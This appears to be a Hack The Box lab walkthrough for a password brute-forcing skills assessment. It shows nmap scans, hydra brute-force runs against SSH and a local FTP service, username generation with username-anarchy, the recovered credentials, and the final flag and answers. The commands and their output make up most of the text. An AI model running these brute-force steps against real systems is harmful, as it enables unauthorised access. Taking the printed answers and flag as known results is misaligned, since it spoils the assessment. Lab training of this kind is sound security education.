# Skills Assessment Part 2
Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

## Questions
1. What is the username of the ftp user you find via brute-forcing? **Answer: thomas**
   - Identify that ssh is running on port 32250:
        ```sh
        $ nmap -Pn -sV -p 32250 154.57.164.67
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-14 04:46 CDT
        Nmap scan report for 154-57-164-67.static.isp.htb.systems (154.57.164.67)
        Host is up (0.15s latency).

        PORT      STATE SERVICE VERSION
        32250/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        ```
   - Run hydra with the basic HTTP authentication module → found `satwossh`:`password1`
        ```sh
        $ hydra -l satwossh -P 2023-200_most_used_passwords.txt -s 32250 ssh://154.57.164.67
        Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 04:47:00
        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the   tasks: use -t 4
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
        [DATA] attacking ssh://154.57.164.67:32250/
        [STATUS] 96.00 tries/min, 96 tries in 00:01h, 107 to do in 00:02h, 13 active
        [32250][ssh] host: 154.57.164.67   login: satwossh   password: password1
        ```
   - SSH to the target with found credentials and identify that FTP is opening:
     ```sh
     $ ssh -p 32250 satwossh@154.57.164.67
     satwossh@ng-1863259-loginbfsatwo-9vaiy-54d95956d-nl8h4:~$ nmap localhost
     Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 09:56 UTC
     Nmap scan report for localhost (127.0.0.1)
     Host is up (0.00019s latency).
     Other addresses for localhost (not scanned): ::1
     Not shown: 998 closed ports
     PORT   STATE SERVICE
     21/tcp open  ftp
     22/tcp open  ssh

     Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
     ```
   - Read the `IncidentReport.txt` → found clue for a username `Thomas Smith`:
     ```sh
     satwossh@ng-1863259-loginbfsatwo-9vaiy-54d95956d-nl8h4:~$ cat IncidentReport.txt 
     System Logs - Security Report

     Date: 2024-09-06

     Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

     All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
     ```
   - Use `username-anarchy` to create a list of usernames associated with this name:
     ```sh
     $ cd username-anarchy
     $ ./username-anarchy Thomas Smith > ../thomas_smith_usernames.txt
     ```
   - Run hydra with the create username list and the password list already stored on the machine:
     ```sh
     $ hydra -L thomas_smith_usernames.txt -P passwords.txt ftp://localhost
     Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

     Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 10:06:07
     [DATA] max 16 tasks per 1 server, overall 16 tasks, 2970 login tries (l:15/p:198), ~186 tries per task
     [DATA] attacking ftp://localhost:21/
     [21][ftp] host: localhost   login: thomas   password: chocolate!
     ```
2. What is the flag contained within flag.txt **Answer: HTB{brut3f0rc1ng_succ3ssful}**
   - Use the found credentials, login to FTP and read the flag:
     ```sh
     $ ftp ftp://thomas:'chocolate!'@localhost
     Trying [::1]:21 ...
     Connected to localhost.
     220 (vsFTPd 3.0.5)
     331 Please specify the password.
     230 Login successful.
     Remote system type is UNIX.
     Using binary mode to transfer files.
     200 Switching to Binary mode.
     ftp> ls
     229 Entering Extended Passive Mode (|||19189|)
     150 Here comes the directory listing.
     -rw-------    1 1001     1001           28 Sep 10  2024 flag.txt
     226 Directory send OK.
     ftp> more flag.txt
     HTB{brut3f0rc1ng_succ3ssful}
     ```